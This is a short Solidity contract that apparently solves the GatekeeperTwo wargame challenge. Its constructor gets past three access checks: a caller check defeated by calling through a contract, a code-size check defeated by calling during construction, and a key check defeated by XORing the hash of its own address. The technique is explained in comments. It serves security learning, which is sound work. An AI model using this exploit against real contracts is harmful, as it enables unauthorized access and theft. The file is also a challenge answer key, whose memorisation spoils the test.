// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract Hax2 {
    constructor(GatekeeperTwo gate) {
        // gate 1 -- will be bypassed automatically by the use of this contract as the msg.sender will be the contract and tx.origin the creator of the contract.
        /* 
        modifier gateOne() {
            require(msg.sender != tx.origin);
            _;
        } 
        */
        // gate2 -- calling from the constructor makes extcodesize retuirn 0.
        /* 
        modifier gateTwo() {
          uint256 x;
          assembly {
              x := extcodesize(caller())
          }
          require(x == 0);
          _;
        }
        */
        // gate 3 -- just xor uint64(bytes8(keccak256(abi.encodePacked(msg.sender)) with type(uint64).max -- use foundry's chisel to experiment if needed
        // remember msg.sender at this point is contract's address
        /*
        modifier gateThree(bytes8 _gateKey) {
          require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
          _;
        } 
        */
        gate.enter(
            bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                    type(uint64).max
            )
        );
    }
}
